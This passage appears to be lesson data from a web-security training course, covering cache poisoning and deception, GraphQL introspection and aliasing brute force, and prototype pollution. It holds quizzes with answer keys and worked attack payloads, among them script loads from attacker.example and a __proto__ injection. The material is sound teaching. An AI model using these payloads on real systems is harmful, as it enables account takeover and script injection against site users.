          "Every subsequent visitor who requests that same URL (with a perfectly normal browser, no attacker header at all) receives the cached, poisoned page \u2014 including the attacker's malicious script tag \u2014 until the cache entry expires or is purged. One malicious request can affect every visitor during that window.",
        ],
        code: `GET / HTTP/1.1
Host: target.example
X-Forwarded-Host: attacker.example

HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
...
<script src="https://attacker.example/script.js"></script>`,
        tone: "offense",
        check: {
          type: "mc",
          q: "Why does poisoning the cache with one malicious request affect OTHER, later visitors who never sent any attacker-controlled header themselves?",
          options: [
            "It doesn't \u2014 only the attacker's own browser sees the poisoned content",
            "The cache stores the poisoned response under the same cache key as the legitimate page, so it serves that stored copy to anyone who requests the same URL afterward",
            "The attacker's header is forwarded to every future visitor's browser automatically",
            "Cache poisoning requires compromising every victim's browser individually",
          ],
          answer: 1,
          why: [
            "It very much does affect others \u2014 that's the entire point and danger of cache poisoning versus a simple reflected attack.",
            "Correct \u2014 because the cache key (URL+Host) looks identical for the attacker's request and any normal visitor's request, the cache can't tell them apart and serves the stored poisoned copy to everyone.",
            "Headers are per-request; they are not relayed to other users' browsers. It's the STORED RESPONSE BODY that affects others, not the header itself.",
            "No per-victim compromise is needed \u2014 that's what makes caching poisoning so much more impactful than a typical reflected attack, which usually needs each victim to be individually targeted.",
          ],
          explain:
            "Because the cache key is unaware of the unkeyed input, it treats the poisoned and legitimate requests as identical, so one poisoning request contaminates the shared stored response for the cache's entire eligible audience.",
          hints: ["What does the cache actually store, and under what key?", "Does the cache re-check the unkeyed header on every subsequent request, or just the key?"],
          ref: "The failure: poisoning via an unkeyed header",
        },
      },
      {
        title: "Worked example: poisoning a password-reset link",
        kind: "example",
        body: [
          "Scenario: shop.example sends password-reset emails containing a link built from the Host header seen by the server, e.g. `https://<Host>/reset?token=...`. The page that triggers this email is cached (perhaps the confirmation page shown right after submitting the reset form).",
          "Step 1 \u2014 test for the unkeyed input: send `GET /forgot-password HTTP/1.1` with `Host: shop.example` and `X-Forwarded-Host: attacker.example`. If the rendered confirmation page's absolute links now point at attacker.example, the application is reading this unkeyed header.",
          "Step 2 \u2014 check cacheability: inspect the response for `Cache-Control: public` or similar, and confirm the cache actually stores this exact URL by requesting it twice and checking for a cache-hit indicator header (e.g. `X-Cache: HIT`) on the second request.",
          "Step 3 \u2014 poison it: send the poisoning request (Host: shop.example, X-Forwarded-Host: attacker.example) to the real reset-request endpoint so the cache stores a confirmation page whose embedded reset link points at attacker.example instead of shop.example.",
          "Step 4 \u2014 wait for victims: any real user who requests a password reset and lands on the now-poisoned, cached confirmation page sees a reset link pointing to the attacker's domain. If they click it and the attacker's page proxies or phishes the token, the attacker captures the victim's password-reset token and can take over their account.",
          "WHY each step matters: step 1 proves the unkeyed input is actually read by the app; step 2 proves the specific URL is cached at all (not every page is); only once both are true does poisoning have any real-world effect, which step 3-4 then demonstrate concretely.",
        ],
        code: `GET /forgot-password HTTP/1.1
Host: shop.example
X-Forwarded-Host: attacker.example

HTTP/1.1 200 OK
Cache-Control: public, max-age=600
X-Cache: MISS
...
<a href="https://attacker.example/reset?token=abc123">Finish resetting your password</a>`,
        tone: "offense",
        check: {
          type: "order",
          q: "Order the steps of the password-reset cache-poisoning worked example.",
          items: [
            "Confirm the application reads and reflects the unkeyed X-Forwarded-Host header into the page",
            "Confirm the specific URL is actually cached by checking for a cache-hit indicator on a repeated request",
            "Send the poisoning request so the cache stores a confirmation page with a malicious reset link",
            "Wait for real users to load the poisoned cached page and be shown the attacker's reset link",
          ],
          explain: "You must prove both conditions \u2014 unkeyed input is reflected, AND the page is cached \u2014 before the poisoning attempt can have any real victim impact.",
          hints: ["Reflection alone, without caching, only affects the attacker's own request.", "Caching alone, without reflection, has nothing malicious to store."],
          ref: "Worked example: poisoning a password-reset link",
        },
      },
      {
        title: "A related but different bug: web cache deception",
        kind: "explain",
        body: [
          "Web Cache Deception is the mirror-image problem: instead of tricking the cache into storing a MALICIOUS response for EVERYONE, it tricks the cache into storing one SPECIFIC USER's PRIVATE response in a place that OTHER people (including the attacker) can later retrieve from the cache.",
          "Mechanism: some caches decide 'this looks cacheable' based on the URL's FILE EXTENSION, assuming anything ending in `.css`, `.js`, or `.jpg` must be a static, public asset \u2014 regardless of what the application actually returned. If a path like `/profile/;.css` or `/profile%2f..%2fstyle.css` still routes the application to the dynamic, authenticated `/profile` handler (because the application ignores the trailing garble), the application returns the user's real private profile data, but the cache stores it thinking it just cached a harmless static stylesheet.",
          "An attacker tricks a logged-in victim into visiting that crafted URL (e.g. via a link), their private data gets cached under that exact URL, and the attacker then simply requests the SAME URL themselves to retrieve the victim's cached private data from the public cache \u2014 no header injection or Host manipulation required, unlike classic cache poisoning.",
        ],
        tone: "offense",
      },
      {
        title: "Common mistakes",
        kind: "mistakes",
        body: [
          "Mistake: confusing cache poisoning with cache deception because both involve a cache serving 'wrong' content. Poisoning injects malicious content that is served to EVERYONE; deception leaks one victim's PRIVATE content to the attacker specifically \u2014 the direction of the harm is reversed.",
          "Mistake: assuming a header is unkeyed just because you can set it. You must verify BOTH that the application reads/uses the header's value in its output, AND that the cache does not include it in the cache key \u2014 a header that's keyed (included in the key) just creates a separate, harmless cache entry instead of overwriting the shared one.",
          "Mistake: poisoning a shared production cache during testing without a safe cleanup plan. Because poisoning affects every visitor until the entry expires or is purged, test on a URL/path you can afford to leave poisoned briefly, or coordinate a purge immediately after confirming impact, within your authorised scope.",
        ],
      },
      {
        title: "Guided practice",
        kind: "practice",
        body: [
          "news.example caches `/article/42` for 10 minutes based on URL+Host only. The app reads `X-Forwarded-Scheme` to decide whether to render links as `http://` or `https://`, embedding that scheme in canonical link tags. An attacker sends a request with `X-Forwarded-Scheme: javascript` (an invalid scheme the app doesn't validate), producing a broken/malicious canonical link that gets cached. Is this cache poisoning or cache deception, and why?",
        ],
        check: {
          type: "mc",
          q: "This scenario (poisoning the cached canonical link for ALL future visitors of /article/42 via an unkeyed scheme header) is:",
          options: [
            "Cache deception \u2014 it leaks one user's private data",
            "Cache poisoning \u2014 malicious content is stored and served to every subsequent visitor of that shared URL",
            "Neither \u2014 this isn't a caching issue at all",
            "A CORS misconfiguration",
          ],
          answer: 1,
          why: [
            "No private user-specific data is being leaked here; a shared public article page is being corrupted for everyone.",
            "Correct \u2014 the unkeyed X-Forwarded-Scheme header lets the attacker store malicious content under the normal cache key, affecting every subsequent visitor to that same URL.",
            "The cache's storing of a response built from an unkeyed input is exactly the caching issue covered in this lesson.",
            "There's no Origin/credentials mechanism involved; this is purely a cache-key/unkeyed-input issue.",
          ],
          explain:
            "The defining trait of classic cache poisoning is that ONE attacker request corrupts the SHARED cached response, impacting every future visitor \u2014 unlike deception, which exposes one specific victim's own private data to the attacker.",
          hints: ["Who is harmed: everyone visiting the page, or specifically one victim whose private data leaks?", "Deception relies on file-extension tricks on a normally-private path, not an unkeyed header."],
          ref: "A related but different bug: web cache deception",
        },
      },
      {
        title: "Practical relevance: what a poisoning PoC proves and does not prove",
        kind: "relevance",
        body: [
          "A successful poisoning PoC (e.g. injecting a harmless marker string into a cached page and confirming a second, unrelated request shows that marker) proves the cache serves content influenced by an unkeyed input to unrelated requesters \u2014 a genuine, high-impact finding since it scales to every visitor.",
          "It does NOT by itself prove you can deliver a working exploit (like actual XSS or credential theft) through that channel \u2014 you must separately confirm the application doesn't sanitise or restrict the injected value before escalating from 'I can influence the cached content' to 'I can run JavaScript in victims' browsers'.",
          "Because poisoning affects real third-party visitors of a shared cache, only test with inert markers first, prefer non-production/staging targets when available, and immediately purge or expire any confirmed-poisoned entries you created, within your authorised scope.",
        ],
      },
    ],
    exercises: [
      {
        type: "mc",
        q: "What is a 'Cache Key'?",
        options: [
          "A secret password for the admin panel",
          "The subset of a request a cache uses to decide whether a stored response can be reused",
          "An encrypted token in a cookie",
          "The private key used for TLS",
        ],
        answer: 1,
        why: [
          "Cache keys have nothing to do with authentication secrets.",
          "Correct \u2014 the cache key (typically URL + Host) is what the cache compares between requests to decide if they're 'the same' request.",
          "Cookies may sometimes be PART of a cache key configuration, but the cache key itself is not a token stored in a cookie.",
          "TLS private keys are unrelated to HTTP response caching.",
        ],
        explain: "The cache key is what the cache uses to determine if a new request matches a previously cached response, and therefore whether to serve the stored copy.",
        hints: [
          "It's like a dictionary key for the cache's storage.",
          "It usually includes the URL and Host header.",
        ],
        ref: "Prerequisites: cache keys and unkeyed inputs",
      },
      {
        type: "fill",
        q: "In Web Cache Deception, the cache decides a response is cacheable based on the URL's file ____, even though the application actually returned dynamic, private data.",
        answers: ["extension", "suffix"],
        explain: "Cache deception commonly exploits caches that treat URLs ending in .css, .js, etc. as automatically static/public, regardless of what content the application actually produced for that path.",
        hints: [
          "Think .css, .js, .jpg.",
          "It's the part of the filename after the dot.",
        ],
        ref: "A related but different bug: web cache deception",
      },
      {
        type: "mc",
        q: "Which statement correctly distinguishes cache poisoning from cache deception?",
        options: [
          "Poisoning leaks one victim's private data; deception affects every visitor",
          "Poisoning affects every visitor of a shared cached URL; deception leaks one specific victim's private data to the attacker",
          "They are the same attack with different names",
          "Poisoning only works over HTTP/2, deception only works over HTTP/1.1",
        ],
        answer: 1,
        why: [
          "This reverses the two attacks' actual impact direction.",
          "Correct \u2014 poisoning corrupts the shared response for everyone; deception exposes one victim's own private response to the attacker.",
          "They exploit different mechanisms (unkeyed inputs vs. extension-based cacheability assumptions) and have opposite impact directions.",
          "Neither attack is tied to a specific HTTP protocol version.",
        ],
        explain: "Poisoning is a 'malicious content for many' attack; deception is a 'private content for one, leaked to the attacker' attack.",
        hints: ["Who is the victim in each case: the public, or one specific user?", "Think about which attack needs the application to read an unkeyed header, versus which needs file-extension confusion."],
        ref: "A related but different bug: web cache deception",
      },
      {
        type: "match",
        q: "Match the term to its concept.",
        pairs: [
          ["Unkeyed input", "Part of a request the cache ignores when building its key, but the app still uses"],
          ["Cache poisoning", "Making the cache store a malicious response served to all subsequent visitors"],
          ["Cache deception", "Tricking the cache into storing one user's private response under a path others can request"],
          ["X-Forwarded-Host", "A commonly unkeyed header frequently used for poisoning attacks"],
        ],
        explain: "Poisoning affects everyone via a shared cached response; deception targets one specific victim's private data via extension-based cache confusion.",
        hints: [
          "Poisoning is about malicious content served broadly.",
          "Deception is about leaking private content to the attacker specifically.",
          "Unkeyed means 'not part of the cache key'.",
        ],
        ref: "Prerequisites: cache keys and unkeyed inputs",
      },
      {
        type: "order",
        q: "Order the steps to confirm and exploit an unkeyed-header cache poisoning bug responsibly.",
        items: [
          "Send a request with a suspicious unkeyed header and check whether the rendered page reflects its value",
          "Confirm the specific URL is actually cached (e.g. via a cache-hit response header on a repeat request)",
          "Send the poisoning payload to store a malicious (or clearly marked, inert) response under the shared cache key",
          "Verify an unrelated follow-up request receives the poisoned content, then purge/expire the entry",
        ],
        explain: "Both reflection and cacheability must be confirmed before poisoning has any real impact, and any confirmed poisoning should be cleaned up promptly given its shared, multi-victim blast radius.",
        hints: ["Reflection without caching only affects your own request.", "Always clean up a poisoned shared resource once impact is confirmed."],
        ref: "Worked example: poisoning a password-reset link",
      },
    ],
  },
  {
    id: "graphql",
    title: "GraphQL Security",
    summary: "Exploiting the unique features of GraphQL APIs, from introspection to batching.",
    cards: [
      {
        title: "Objective",
        kind: "objective",
        body: [
          "By the end of this lesson you can: explain how GraphQL differs from a REST API in how clients request data, use introspection to map a schema, use aliasing/batching to bypass naive per-request rate limits, and recognise when mutations lack the authorization checks their equivalent queries have.",
        ],
      },
      {
        title: "Normal operation: one endpoint, client-specified shape",
        kind: "intuition",
        body: [
          "A typical REST API exposes many fixed endpoints (`/users/5`, `/users/5/posts`), each returning a server-decided shape of data. GraphQL instead usually exposes a SINGLE endpoint (commonly `/graphql`), and the CLIENT sends a query describing exactly which fields it wants back, in whatever nested shape it needs.",
          "Analogy: REST is like a restaurant with a fixed menu \u2014 you order 'the #5 combo' and get exactly what's defined. GraphQL is like a custom sandwich counter \u2014 you specify exactly which ingredients (fields) you want, including nested ones ('the bread, but also tell me what's inside the special sauce'), and get back exactly that shape, nothing more.",
          "This flexibility is genuinely useful: mobile apps can request only the fields they need (saving bandwidth), and frontend teams can evolve independently of backend teams since there's no need to add a new REST endpoint for every new data shape.",
          "Where it breaks: because the SERVER exposes its entire schema's structure to make this flexibility possible, and because a single request can describe an arbitrarily complex, repeated, or deeply nested set of operations, GraphQL creates a few attack surfaces that don't really exist in fixed-endpoint REST APIs: schema self-disclosure, request-level multiplication of operations, and authorization logic that's easy to apply inconsistently across many small resolver functions.",
        ],
        tone: "info",
      },
      {
        title: "Prerequisites: queries, mutations, and resolvers",
        kind: "prereq",
        body: [
          "A `query` reads data (the GraphQL equivalent of a REST GET). A `mutation` changes data (the equivalent of POST/PUT/DELETE). Both are sent to the same endpoint, typically as a POST request with a JSON body containing the query text.",
          "A `resolver` is the server-side function that actually fetches or modifies data for one specific field in the schema. Each field in a query or mutation is backed by its own resolver function, written and secured independently by developers.",
          "An `alias` lets a client rename a field in the response and, crucially, call the SAME field or operation MULTIPLE TIMES within one request, each with a different alias so the results don't collide: `attempt1: login(...) { token } attempt2: login(...) { token }` runs the `login` operation twice in a single HTTP request.",
        ],
      },
      {
        title: "The failure: introspection left enabled in production",
        kind: "explain",
        body: [
          "GraphQL servers can optionally answer special meta-fields, `__schema` and `__type`, that describe the ENTIRE schema: every query, mutation, type, field, and argument the API supports \u2014 this feature is called introspection, and it's genuinely useful during development for auto-generating documentation and client code.",
          "Mechanism: if introspection is left enabled in production (it often is, because disabling it is an easy step to forget), anyone who can reach the `/graphql` endpoint can send a single introspection query and receive the complete map of the API's capabilities \u2014 including fields and mutations that were never meant to be publicly known, such as `deleteAllUsers` or `impersonateUser`.",
          "This is reconnaissance, not exploitation by itself, but it collapses what would normally require extensive REST endpoint guessing/fuzzing into a single request, since the schema itself tells you exactly what's callable and what arguments each call expects.",
        ],
        code: `query { __schema { queryType { fields { name } } mutationType { fields { name args { name type { name } } } } } }

# example mutation fields this might reveal:
# updateUser(id: ID!, isAdmin: Boolean)
# deletePost(id: ID!)
# impersonateUser(targetId: ID!)`,
        tone: "info",
        check: {
          type: "mc",
          q: "What does a successful introspection query return?",
          options: [
            "The full contents of the underlying database",
            "The structure of the GraphQL schema: available queries, mutations, types, and their arguments",
            "The server's environment variables",
            "A list of currently logged-in users",
          ],
          answer: 1,
          why: [
            "Introspection describes the API's shape, not its stored data.",
            "Correct \u2014 introspection is a self-documentation feature that reveals the complete schema, including any fields that weren't meant to be publicized.",
            "Environment variables are server configuration, not part of the GraphQL schema.",
            "Session/user lists are data, not schema structure; introspection doesn't expose runtime data.",
          ],
          explain: "Introspection is a schema-discovery feature. It tells you WHAT you can ask for and HOW, not the actual stored data \u2014 but knowing every available mutation (including unintended ones) is powerful reconnaissance on its own.",
          hints: ["Think 'documentation of the API' versus 'contents of the API'.", "It describes types and fields, not stored records."],
          ref: "The failure: introspection left enabled in production",
        },
      },
      {
        title: "Worked example: from introspection to a login brute-force bypass",
        kind: "example",
        body: [
          "Scenario: auth.example exposes `/graphql` with introspection enabled and a `login(username: String!, password: String!): AuthPayload` mutation, protected by a rate limiter that blocks an IP after 5 failed login HTTP REQUESTS per minute.",
          "Step 1 \u2014 map the schema: run an introspection query and find the exact `login` mutation signature, confirming it accepts username/password and returns a token field you can check for success.",
          "Step 2 \u2014 test the rate limit's granularity: send 6 separate login mutation requests quickly and confirm the 6th is blocked \u2014 establishing the limiter counts HTTP REQUESTS, not individual login attempts within a request.",
          "Step 3 \u2014 build an aliased batch: construct a SINGLE request containing 100 aliased calls to `login`, each with a different password guess from a wordlist, all using the same username. Because this is ONE HTTP request, the request-counting rate limiter sees it as one request, not 100 attempts.",
          "Step 4 \u2014 read the results: scan the single JSON response for any aliased result whose `token` field is non-null \u2014 that alias's password guess was correct, achieving 100 password attempts for the 'cost' of one rate-limited request.",
          "WHY each step matters: step 1 gives you the exact field/argument names needed to build a working payload; step 2 proves the limiter's weakness (it counts requests, not logical attempts) before you build the full exploit; steps 3-4 turn that weakness into a practical, scalable brute-force bypass.",
        ],
        code: `query {
  a1: login(username: "admin", password: "password123") { token }
  a2: login(username: "admin", password: "letmein") { token }
  a3: login(username: "admin", password: "admin2024") { token }
  # ... up to 100 aliased attempts in one request
}`,
        tone: "offense",
        check: {
          type: "order",
          q: "Order the steps of the aliasing-based brute-force worked example.",
          items: [
            "Run introspection to discover the exact login mutation's name and arguments",
            "Confirm the rate limiter counts HTTP requests, not individual login attempts",
            "Send one request containing many aliased login calls, each with a different password guess",
            "Scan the single JSON response for the aliased result with a non-null token",
          ],
          explain: "Reconnaissance (schema + limiter behaviour) must happen before building the batched exploit payload, so you know exactly what to call and why the technique will bypass the defence.",
          hints: ["You need the mutation's exact signature before you can call it correctly.", "Confirming the limiter's weakness comes before exploiting it."],
          ref: "Worked example: from introspection to a login brute-force bypass",
        },
      },
      {
        title: "A different kind of failure: authorization gaps on mutations",
        kind: "explain",
        body: [
          "Because every field in GraphQL is backed by its own independently-written resolver function, developers sometimes carefully add authorization checks to `Query` resolvers (e.g. 'can this user view THIS post?') but forget to add equivalent checks to the corresponding `Mutation` resolver (e.g. 'can this user DELETE or UPDATE this post?'), since the two are written as separate functions and easy to review in isolation.",
          "Mechanism: an attacker who discovers (via introspection or documentation) a mutation like `updateUser(id: ID!, isAdmin: Boolean)` simply calls it directly with their own low-privilege session token and someone else's `id`, or sets `isAdmin: true` on their own account. If the resolver never re-checks 'does the CALLER actually have permission to modify THIS target / set THIS field', the mutation succeeds regardless of the caller's actual role.",
          "This is conceptually identical to Broken Object-Level Authorization / Broken Function-Level Authorization in REST APIs \u2014 GraphQL doesn't introduce a new root cause here, but its single-endpoint, many-small-resolvers structure makes it easy to secure 90% of operations consistently while missing one.",
        ],
        tone: "defense",
      },
      {
        title: "Common mistakes",
        kind: "mistakes",
        body: [
          "Mistake: assuming introspection being disabled means the schema is fully hidden. An attacker can still often reconstruct much of the schema through 'field suggestion' error messages (many GraphQL servers helpfully respond 'Did you mean `usrName`?' when you guess a close field name) or by trying common field names observed in client-side JavaScript bundles.",
          "Mistake: treating aliasing/batching bypass as only a login brute-force issue. The same technique defeats ANY per-request rate limit \u2014 password reset token guessing, coupon code guessing, OTP brute-forcing \u2014 anywhere a limiter counts HTTP requests instead of logical operations within them.",
          "Mistake: assuming because a Query is properly authorized, the equivalent Mutation is too. Each resolver must be checked independently; a secure `post(id)` query tells you nothing about whether `updatePost(id, ...)` or `deletePost(id)` enforce the same ownership check.",
        ],
      },
      {
        title: "Guided practice",
        kind: "practice",
        body: [
          "Introspection on social.example reveals a mutation `changeEmail(userId: ID!, newEmail: String!): Boolean`. Calling it as a normal logged-in user with your OWN `userId` works as expected. You then try calling it with a DIFFERENT numeric `userId` belonging to another account \u2014 and it succeeds, changing that other user's email. What specific authorization check is missing from this resolver?",
        ],
        check: {
          type: "mc",
          q: "What is the missing check that allowed changeEmail to succeed against another user's account?",
          options: [
            "The mutation should have required a GraphQL introspection query first",
            "The resolver should verify that the authenticated caller's own identity matches (or is otherwise authorized to modify) the target userId before making the change",
            "The mutation should have used a query instead of a mutation",
            "The newEmail argument should have been renamed to something less guessable",
          ],
          answer: 1,
          why: [
            "Introspection is a reconnaissance feature with no bearing on authorization enforcement.",
            "Correct \u2014 this is a broken object-level authorization gap: the resolver changes whichever userId is supplied without confirming the caller is allowed to act on that specific target.",
            "Whether an operation is labelled query or mutation is a GraphQL type-system convention, not an authorization mechanism.",
            "Renaming an argument provides no real security \u2014 this is security-by-obscurity and doesn't fix the missing ownership check.",
          ],
          explain:
            "This mirrors Broken Object-Level Authorization: the resolver must check 'is the caller authorized to modify THIS specific target record', not just 'is the caller logged in at all'.",
          hints: ["What should the server verify BEFORE applying newEmail to the given userId?", "Being authenticated is not the same as being authorized for a specific target."],
          ref: "A different kind of failure: authorization gaps on mutations",
        },
      },
      {
        title: "Practical relevance: what these findings prove and do not prove",
        kind: "relevance",
        body: [
          "Confirming introspection is enabled proves information disclosure of the API's structure \u2014 real, but typically lower severity on its own unless it reveals specific sensitive fields/mutations that then enable a further finding (like the brute-force bypass or the authorization gap above).",
          "Confirming an aliasing-based rate-limit bypass or a missing mutation authorization check proves CONCRETE impact \u2014 but you must still confirm the actual blast radius (e.g. which fields/mutations are affected, whether real accounts could be modified) before reporting a severity, rather than stopping at 'the technique works in principle'.",
          "Brute-forcing real user credentials via aliasing, even against your own authorised target, can lock out or affect real user accounts \u2014 use test accounts and a small, controlled wordlist/sample size to DEMONSTRATE the technique rather than running a full large-scale brute-force against production.",
        ],
      },
    ],
    exercises: [
      {
        type: "mc",
        q: "What does an introspection query return?",
        options: [
          "The full database contents",
          "The structure and schema of the GraphQL API",
          "The server's environment variables",
          "A list of logged-in users",
        ],
        answer: 1,
        why: [
          "Introspection has no access to stored data; it only describes the schema.",
          "Correct \u2014 introspection allows a client to ask the GraphQL server for information about its schema, including types, fields, and mutations.",
          "Environment variables are a server configuration detail, unrelated to the GraphQL type system.",
          "Introspection reveals API structure, not runtime session data.",
        ],
        explain: "Introspection is a self-discovery feature that reveals types, queries, and mutations \u2014 it's the GraphQL equivalent of API documentation, served live by the API itself.",
        hints: [
          "It's a feature for self-discovery.",
          "It reveals types, queries, and mutations, not data.",
        ],
        ref: "The failure: introspection left enabled in production",
      },
      {
        type: "order",
        q: "Order the steps for a brute-force attack using GraphQL aliasing.",
        items: [
          "Identify a login mutation and its exact arguments through introspection",
          "Confirm the rate limiter counts HTTP requests rather than individual attempts",
          "Create a single GraphQL query with hundreds of aliased calls to that mutation",
          "Send the single request to the server and check the response for a successful login token",
        ],
        explain: "Aliasing allows many operations to be packed into a single HTTP request, often bypassing per-request rate limiters that don't account for batched operations.",
        hints: [
          "First, find the target mutation's exact signature.",
          "Confirm the limiter's weakness before building the full batch payload.",
        ],
        ref: "Worked example: from introspection to a login brute-force bypass",
      },
      {
        type: "fill",
        q: "The GraphQL feature that lets a client call the same field multiple times in one request, each tagged with a different name, is called ____.",
        answers: ["aliasing", "an alias", "aliases"],
        explain: "Aliasing lets a client rename a field's result key, which also permits calling the same operation multiple times in one request with distinguishable results \u2014 the basis of the rate-limit bypass technique.",
        hints: ["It's how you can call `login` twice with different result key names.", "Starts with 'alia-'."],
        ref: "Prerequisites: queries, mutations, and resolvers",
      },
      {
        type: "mc",
        q: "A `post(id)` query correctly checks that only the post's author can view unpublished drafts. What does this tell you about the `updatePost(id, ...)` mutation's authorization?",
        options: [
          "Nothing \u2014 each resolver's authorization must be checked independently",
          "It guarantees updatePost has the same checks, since they share the same `id` type",
          "It guarantees updatePost requires admin privileges",
          "It means updatePost doesn't need any authorization at all",
        ],
        answer: 0,
        why: [
          "Correct \u2014 queries and mutations are backed by separate resolver functions; a secure query tells you nothing about the authorization logic of a different resolver.",
          "Sharing an argument type says nothing about what checks a DIFFERENT function actually performs.",
          "There's no basis to assume a specific privilege level without inspecting the resolver itself.",
          "The opposite is true \u2014 mutations that change data generally need at least as much scrutiny as the queries that read it.",
        ],
        explain: "Each GraphQL resolver is an independently written function; securing a Query resolver has no automatic effect on its corresponding Mutation resolver, which is exactly why authorization gaps on mutations are a common, distinct finding.",
        hints: ["Are Query and Mutation resolvers the same function or separate functions?", "Recall the authorization-gap failure card."],
        ref: "A different kind of failure: authorization gaps on mutations",
      },
      {
        type: "match",
        q: "Match the GraphQL concept to the security risk it enables.",
        pairs: [
          ["Introspection", "Information disclosure of the full API schema, including unintended fields"],
          ["Aliasing/batching", "Rate-limit bypass and brute forcing by packing many operations into one request"],
          ["Mutation without ownership check", "Broken object-level authorization, letting a caller modify another user's data"],
          ["Resolver", "The independent server-side function backing one schema field, each needing its own security review"],
        ],
        explain: "Each feature of GraphQL, while useful for developers, presents a distinct attack surface rooted in the same theme: flexibility for the client can mean an inconsistently-secured server.",
        hints: [
          "Introspection is about revealing structure.",
          "Aliasing is about repeating operations cheaply.",
          "A missing ownership check is an authorization gap, not an information-disclosure issue.",
        ],
        ref: "Prerequisites: queries, mutations, and resolvers",
      },
    ],
  },
  {
    id: "proto-pollution",
    title: "Prototype Pollution",
    summary: "Manipulating JavaScript prototypes to achieve DOM XSS and local privilege escalation.",
    cards: [
      {
        title: "Objective",
        kind: "objective",
        body: [
          "By the end of this lesson you can: explain how JavaScript's prototype-based inheritance normally lets objects share default properties, identify how an unsafe merge/clone function lets an attacker pollute `Object.prototype`, and trace a source-to-gadget-to-sink chain that turns pollution into DOM XSS.",
        ],
      },
      {
        title: "Normal operation: why objects share a prototype at all",
        kind: "intuition",
        body: [
          "In JavaScript, almost every plain object silently inherits properties and methods from a shared object called `Object.prototype` \u2014 this is why you can call `.toString()` or `.hasOwnProperty()` on virtually any object without ever defining those methods yourself.",
          "Analogy: imagine every object in your program is a transparent sheet laid on top of one master reference sheet (the prototype). If you look up a property that isn't written on your own sheet, JavaScript automatically checks the master sheet underneath. This is efficient \u2014 common behaviour is defined once, on the master sheet, instead of being copied onto every single object.",
          "This is genuinely useful: it's how built-in methods work everywhere for free, and how library authors can add shared default behaviour to many objects at once.",
          "Where it breaks: that master sheet is ONE SHARED object for the ENTIRE running program. If any code \u2014 including code processing attacker-supplied input \u2014 is tricked into WRITING to that shared master sheet instead of to an individual object's own sheet, every single plain object in the program instantly, silently inherits that new property, including objects created later by completely unrelated code.",
        ],
        tone: "info",
      },
      {
        title: "Prerequisites: __proto__, merge functions, and recursive key assignment",
        kind: "prereq",
        body: [
          "`obj.__proto__` is a special accessor property that most JavaScript engines expose on every object, which reads and (if written to) replaces the object's underlying prototype link. Writing to `someObject.__proto__.x = 1` means: follow someObject's prototype link, and set property `x` on WHATEVER OBJECT is at the other end of that link \u2014 which, for a freshly created `{}`, is `Object.prototype` itself.",
          "A 'merge' or 'clone' (sometimes called 'deep extend') function is common utility code that recursively copies every key from a source object into a destination object, often used to apply user-supplied settings on top of default settings: `merge(defaultConfig, userSuppliedConfig)`.",
          "The vulnerability requires the merge function to recurse into keys WITHOUT excluding dangerous key names. If the source object (fully or partially attacker-controlled, e.g. parsed from a JSON request body or a URL query string) contains a key literally named `__proto__` (or `constructor.prototype`), a naive recursive merge will follow that key just like any other and end up writing onto the shared prototype instead of onto the destination object's own properties.",
        ],
      },
      {
        title: "The failure: polluting Object.prototype through an unsafe merge",
        kind: "explain",
        body: [
          "Mechanism: a function recursively merges `source` into `target` by iterating `Object.keys(source)` and, for each key whose value is itself an object, recursing into `target[key]`. If `source` contains `{\"__proto__\": {\"isAdmin\": true}}` and the function does not special-case the string `__proto__`, the recursive call ends up operating on `target.__proto__` \u2014 which for a plain object IS `Object.prototype` \u2014 and sets `isAdmin: true` directly on it.",
          "The effect is immediate and global: from that point forward, EVERY plain JavaScript object in that running process, including ones that have nothing to do with the original merge call and were created afterward, will report `true` when you check `someUnrelatedObject.isAdmin`, because the property lookup falls through to the now-polluted shared prototype.",
          "This is dangerous on its own if any authorization check elsewhere in the code does something like `if (user.isAdmin)` without first setting a safe, explicit default \u2014 the polluted prototype silently supplies `true` for any user object that doesn't already have its OWN `isAdmin` property, which flips the check on for everyone.",
        ],
        code: `function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // no check for "__proto__"
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);

console.log({}.isAdmin); // true -- a BRAND NEW, unrelated object is now "admin"`,
        tone: "offense",
        check: {
          type: "mc",
          q: "After the pollution above runs, why does a completely unrelated, freshly created `{}` object report `isAdmin === true`?",
          options: [
            "Because JSON.parse automatically marks all objects as admin",
            "Because the merge wrote isAdmin onto the shared Object.prototype, which every new plain object inherits from by default",
            "Because the merge function copies isAdmin onto every object that already exists in memory at that moment",
            "It doesn't actually happen \u2014 the pollution only affects the original target object",
          ],
          answer: 1,
          why: [
            "JSON.parse just builds a plain data object from text; it has no special awareness of 'admin' semantics.",
            "Correct \u2014 since the merge followed the __proto__ key, it wrote directly onto the shared Object.prototype, and every plain object (past, present, future) inherits from that same prototype.",
            "Pollution doesn't copy the property onto existing objects' OWN properties \u2014 it writes it once onto the shared prototype, and inheritance makes it appear on every object, including ones not yet created.",
            "The pollution does escape the original target \u2014 that's exactly what makes this bug class severe, unlike a normal object-copying bug confined to one object.",
          ],
          explain: "Prototype pollution is powerful precisely because the write happens ONCE on a shared object, and JavaScript's prototype chain lookup makes that single write visible on every plain object in the process from then on.",
          hints: ["What object does `anything.__proto__` point to for a plain {} object?", "Is the property being copied onto many objects, or written once onto something they all share?"],
          ref: "The failure: polluting Object.prototype through an unsafe merge",
        },
      },
      {
        title: "Worked example: from pollution to DOM XSS via a gadget",
        kind: "example",
        body: [
          "Scenario: a client-side analytics library on shop.example reads a config object and, if a `transport_url` setting is present, dynamically loads a script from that URL to send analytics data \u2014 the library's own code is not directly attacker-reachable, but it reads `window.config` which is built from an unsafe merge of URL query parameters.",
          "Step 1 \u2014 identify the source: find where attacker-controlled input enters an unsafe merge. Here, a query-string parser turns `?__proto__[transport_url]=//attacker.example/evil.js` into a nested object `{__proto__: {transport_url: '//attacker.example/evil.js'}}`, which then gets merged into the app's settings object using the same kind of unsafe recursive merge from the previous card.",
          "Step 2 \u2014 confirm the pollution lands: after the merge runs, check in the browser console that `({}).transport_url` now equals `//attacker.example/evil.js` \u2014 confirming the write reached the shared prototype, not just the local settings object.",
